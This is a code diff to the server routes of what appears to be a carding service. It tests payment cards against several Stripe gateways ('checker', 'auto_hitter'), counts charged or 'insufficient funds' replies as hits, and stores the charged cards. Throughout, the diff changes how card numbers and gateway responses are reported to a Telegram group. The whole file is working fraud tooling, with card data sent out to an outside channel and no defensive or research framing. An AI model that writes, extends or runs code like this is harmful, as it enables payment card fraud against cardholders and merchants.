@@ -870,7 +870,7 @@ export async function registerRoutes(
     }
     if (hitStatus === "CHARGED" || hitStatus === "APPROVED") {
       try {
-        sendLogsGroupTelegram(card, gateway, response || status, hitStatus, userName, String(userId));
+        sendGroupLog(userName, String(userId), card, gateway, response || status);
       } catch {}
     }
     res.json({ ok: true });
@@ -1631,8 +1631,6 @@ export async function registerRoutes(
           const responseLower = responseStr.toLowerCase();
           const isHit = parsed.status === "charged" || responseLower.includes("insufficient") || responseLower.includes("insuff");
           const userName = [req.session.firstName, req.session.lastName].filter(Boolean).join(" ") || req.session.username || req.session.userId;
-          const logStatus = parsed.status === "charged" ? "CHARGED" : parsed.status === "approved" ? "APPROVED" : parsed.status === "live" ? "3DS" : "DECLINED";
-          sendLogsGroupTelegram(cardClean, gateway, responseStr, logStatus, userName, req.session.userId);
 
           if (parsed.status === "charged") {
             const forwardScript = path.join(botDir, "web_forward_hit.py");
@@ -1646,6 +1644,7 @@ export async function registerRoutes(
 
           if (isHit) {
             saveChargedCC(cardClean, gateway, req.session.userId, userName);
+            sendGroupLog(userName, req.session.userId, cardClean, gateway, responseStr, "checker");
             addActivity({
               type: "hit",
               userName,
@@ -1793,8 +1792,6 @@ export async function registerRoutes(
           const resultResponse = result.response || result.status || "";
           const resultLower = resultResponse.toLowerCase();
           const isBatchHit = result.status === "charged" || resultLower.includes("insufficient") || resultLower.includes("insuff");
-          const batchLogStatus = result.status === "charged" ? "CHARGED" : result.status === "approved" ? "APPROVED" : result.status === "live" ? "3DS" : "DECLINED";
-          sendLogsGroupTelegram(card, job.gateway, resultResponse, batchLogStatus, job.userName || job.userId, job.userId);
 
           if (result.status === "charged") {
             const botDir = path.resolve(process.cwd(), "bot");
@@ -1809,6 +1806,7 @@ export async function registerRoutes(
 
           if (isBatchHit) {
             saveChargedCC(card, job.gateway, job.userId, job.userName);
+            sendGroupLog(job.userName || job.userId, job.userId, card, job.gateway, resultResponse, "auto_hitter");
             addActivity({
               type: "hit",
               userName: job.userName,
@@ -2565,6 +2563,7 @@ export async function registerRoutes(
         incrementUsage(req.session.userId, "hitterHits");
         incrementIpHitterUsage(reqIp);
         saveChargedCC(cardClean, "Stripe CO", req.session.userId, userName);
+        sendGroupLog(userName, req.session.userId, cardClean, "Stripe CO", data.message || "Charged", "auto_hitter");
         addActivity({
           type: "hit",
           userName,
@@ -2574,8 +2573,6 @@ export async function registerRoutes(
         });
       }
 
-      const coLogStatus = data.status === "charged" ? "CHARGED" : data.status === "approved" ? "APPROVED" : data.status === "live" ? "3DS" : "DECLINED";
-      sendLogsGroupTelegram(cardClean, "Stripe CO", data.message || data.status || "", coLogStatus, userName, req.session?.userId || "");
       res.json(data);
     } catch (err: any) {
       res.status(500).json({ error: err.message || "Stripe CO failed" });
@@ -2710,6 +2707,7 @@ export async function registerRoutes(
         incrementUsage(req.session.userId, "hitterHits");
         incrementIpHitterUsage(reqIp);
         saveChargedCC(cardClean, "Stripe Invoice", req.session.userId, userName);
+        sendGroupLog(userName, req.session.userId, cardClean, "Stripe Invoice", data.message || "Charged", "auto_hitter");
         addActivity({
           type: "hit",
           userName,
@@ -2719,8 +2717,6 @@ export async function registerRoutes(
         });
       }
 
-      const invLogStatus = data.status === "charged" ? "CHARGED" : data.status === "approved" ? "APPROVED" : data.status === "live" ? "3DS" : "DECLINED";
-      sendLogsGroupTelegram(cardClean, "Stripe Invoice", data.message || data.status || "", invLogStatus, userName, req.session?.userId || "");
       res.json(data);
     } catch (err: any) {
       res.status(500).json({ error: err.message || "Stripe Invoice failed" });
@@ -2853,6 +2849,7 @@ export async function registerRoutes(
         if (data.status === "charged") {
           saveChargedCC(cardClean, "Stripe Billing", req.session.userId, userName);
         }
+        sendGroupLog(userName, req.session.userId, cardClean, "Stripe Billing", data.message || (data.status === "charged" ? "Charged" : "Approved"), "auto_hitter");
         addActivity({
           type: "hit",
           userName,
@@ -2862,8 +2859,6 @@ export async function registerRoutes(
         });
       }
 
-      const billingLogStatus = data.status === "charged" ? "CHARGED" : data.status === "approved" ? "APPROVED" : data.status === "live" ? "3DS" : "DECLINED";
-      sendLogsGroupTelegram(cardClean, "Stripe Billing", data.message || data.status || "", billingLogStatus, userName, req.session?.userId || "");
       res.json(data);
     } catch (err: any) {
       res.status(500).json({ error: err.message || "Stripe Billing failed" });
